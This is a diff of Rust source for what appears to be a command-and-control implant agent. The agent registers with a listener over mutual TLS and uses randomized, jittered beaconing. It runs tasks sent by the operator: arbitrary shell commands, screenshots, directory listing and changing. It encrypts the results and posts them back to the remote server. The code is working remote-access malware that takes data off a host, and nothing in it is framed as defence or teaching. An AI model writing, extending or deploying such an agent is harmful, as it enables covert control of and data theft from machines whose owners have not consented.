@@ -2,11 +2,12 @@ use reqwest::header::{HeaderMap, USER_AGENT};
 use std::{
     collections::HashMap,
     fs::File,
-    io::{self, Write},
+    io::{self, Error, ErrorKind, Write},
     thread,
     time,
     process::Command
 };
+use x25519_dalek::{EphemeralSecret, PublicKey, SharedSecret, StaticSecret};
 
 use crate::{
     core::{
@@ -17,13 +18,12 @@ use crate::{
         }
     },
     Config,
+    config::listener,
     crypto::aesgcm::{cipher, decipher, EncMessage},
-    utils::random::random_name, config::listener,
+    utils::random::{random_name, random_sleeptime},
 };
 
-pub async fn run(config: Config) -> Result<(), std::io::Error> {
-    let sleep = time::Duration::from_secs(config.sleep);
-
+pub async fn run(config: Config) -> Result<(), Error> {
     // Get agent into for registration
     let agent_name =  random_name("agent".to_owned());
     let hostname = match Command::new("hostname").output() {
@@ -51,12 +51,16 @@ pub async fn run(config: Config) -> Result<(), std::io::Error> {
     );
 
     // Initialize client with certificates
-    let root_cert = reqwest::Certificate::from_pem(config.listener.https_root_cert.as_bytes()).unwrap();
+    let root_cert = reqwest::Certificate::from_pem(
+        config.listener.https_root_cert.as_bytes()
+    ).unwrap();
     let client_certs = [
         config.listener.https_client_cert,
         config.listener.https_client_key,
     ].concat();
-    let client_id = reqwest::Identity::from_pem(client_certs.as_bytes()).unwrap();
+    let client_id = reqwest::Identity::from_pem(
+        client_certs.as_bytes()
+    ).unwrap();
 
     let client = reqwest::Client::builder()
         .use_rustls_tls()
@@ -68,12 +72,17 @@ pub async fn run(config: Config) -> Result<(), std::io::Error> {
 
     // Prepare HTTP request headers
     let mut headers = HeaderMap::new();
-    headers.insert(USER_AGENT, config.listener.user_agent.parse().unwrap());
+    headers.insert(
+        USER_AGENT,
+        config.listener.user_agent.parse().unwrap(),
+    );
 
     // Agent registration process
     let mut registered = false;
     while !registered {
-        thread::sleep(sleep);
+        thread::sleep(
+            random_sleeptime(config.sleep.to_owned(), config.jitter.to_owned())
+        );
     
         // Register agent
         let response = match client
@@ -97,7 +106,9 @@ pub async fn run(config: Config) -> Result<(), std::io::Error> {
     loop {
         // TODO: Implement graceful shutdown
 
-        thread::sleep(sleep);
+        thread::sleep(
+            random_sleeptime(config.sleep.to_owned(), config.jitter.to_owned())
+        );
 
         // Get task
         let task = match client
@@ -139,71 +150,148 @@ pub async fn run(config: Config) -> Result<(), std::io::Error> {
         }
 
         match task_args[0].as_str() {
+            "cd" => {
+                match std::env::set_current_dir(task_args[1].as_str()) {
+                    Ok(_) => {
+                        post_task_result(
+                            "The current directory changed successfully.".as_bytes(),
+                            agent_name.to_string(),
+                            listener_url.to_string(),
+                            headers.clone(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                            &client,
+                        ).await;
+                    }
+                    Err(e) => {
+                        post_task_result(
+                            e.to_string().as_bytes(),
+                            agent_name.to_string(),
+                            listener_url.to_string(),
+                            headers.clone(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                            &client,
+                        ).await;
+                    }
+                }
+            }
+            "ls" => {
+                match std::fs::read_dir(task_args[1].as_str()) {
+                    Ok(result) => {
+                        let mut output = String::new();
+                        output = output + "\n";
+                        for path in result {
+                            if let Ok(entry) = path {
+                                let entry_name = entry.path().to_string_lossy().split("/").last().unwrap().to_string();
+                                if let Ok(metadata) = entry.metadata() {
+                                    output = output + format!(
+                                        "{:<20} {}\n", entry_name, metadata.len()).as_str();
+                                } else {
+                                    output = output + format!(
+                                        "{}", entry_name).as_str();
+                                }
+                            }
+                        }
+
+                        post_task_result(
+                            output.as_bytes(),
+                            agent_name.to_string(),
+                            listener_url.to_string(),
+                            headers.clone(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                            &client,
+                        ).await;
+                    }
+                    Err(e) => {
+                        post_task_result(
+                            e.to_string().as_bytes(),
+                            agent_name.to_string(),
+                            listener_url.to_string(),
+                            headers.clone(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                            &client,
+                        ).await;
+                    }
+                }
+            }
+            "pwd" => {
+                match std::env::current_dir() {
+                    Ok(result) => {
+                        post_task_result(
+                            result.to_str().unwrap().as_bytes(),
+                            agent_name.to_string(),
+                            listener_url.to_string(),
+                            headers.clone(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                            &client,
+                        ).await;
+                    }
+                    Err(e) => {
+                        post_task_result(
+                            e.to_string().as_bytes(),
+                            agent_name.to_string(),
+                            listener_url.to_string(),
+                            headers.clone(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                            &client,
+                        ).await;
+                    }
+                }
+            }
             "screenshot" => {
                 match screenshot().await {
                     Ok(result) => {
-                        let cipherdata = CipherData::new(
-                            agent_name.to_string(),
+                        post_task_result(
                             &result,
+                            agent_name.to_string(),
+                            listener_url.to_string(),
+                            headers.clone(),
                             config.my_secret_key.clone(),
                             config.server_public_key.clone(),
-                        );
-
-                        client
-                            .post(format!("{}{}", listener_url.to_string(), "t/r"))
-                            .headers(headers.clone())
-                            .json(&cipherdata)
-                            .send()
-                            .await;
+                            &client,
+                        ).await;
                     }
                     Err(e) => {
-                        let cipherdata = CipherData::new(
-                            agent_name.to_string(),
+                        post_task_result(
                             e.to_string().as_bytes(),
+                            agent_name.to_string(),
+                            listener_url.to_string(),
+                            headers.clone(),
                             config.my_secret_key.clone(),
                             config.server_public_key.clone(),
-                        );
-
-                        client
-                            .post(format!("{}{}", listener_url.to_string(), "t/r"))
-                            .headers(headers.clone())
-                            .json(&cipherdata)
-                            .send()
-                            .await;
+                            &client,
+                        ).await;
                     }
                 }
             }
             "shell" => {
                 match shell(task_args[1..].join(" ").to_string()).await {
                     Ok(result) => {
-                        let cipherdata = CipherData::new(
-                            agent_name.to_string(),
+                        post_task_result(
                             &result,
+                            agent_name.to_string(),
+                            listener_url.to_string(),
+                            headers.clone(),
                             config.my_secret_key.clone(),
                             config.server_public_key.clone(),
-                        );
-
-                        client
-                            .post(format!("{}{}", listener_url.to_string(), "t/r"))
-                            .headers(headers.clone())
-                            .json(&cipherdata)
-                            .send()
-                            .await;
+                            &client,
+                        ).await;
                     }
                     Err(e) => {
-                        let cipherdata = CipherData::new(
-                            agent_name.to_string(),
+                        post_task_result(
                             e.to_string().as_bytes(),
+                            agent_name.to_string(),
+                            listener_url.to_string(),
+                            headers.clone(),
                             config.my_secret_key.clone(),
                             config.server_public_key.clone(),
-                        );
-
-                        client
-                            .post(format!("{}{}", listener_url.to_string(), "t/r"))
-                            .headers(headers.clone())
-                            .json(&cipherdata)
-                            .send()
-                            .await;
+                            &client,
+                        ).await;
                     }
                 }
             }
@@ -214,4 +302,28 @@ pub async fn run(config: Config) -> Result<(), std::io::Error> {
     }
     
     Ok(())
+}
+
+async fn post_task_result(
+    plaindata: &[u8],
+    agent_name: String,
+    listener_url: String,
+    headers: HeaderMap,
+    my_secret_key: StaticSecret,
+    server_public_key: PublicKey,
+    client: &reqwest::Client,
+) {
+    let cipherdata = CipherData::new(
+        agent_name,
+        plaindata,
+        my_secret_key,
+        server_public_key,
+    );
+
+    client
+        .post(format!("{}{}", listener_url, "t/r"))
+        .headers(headers)
+        .json(&cipherdata)
+        .send()
+        .await;
 }
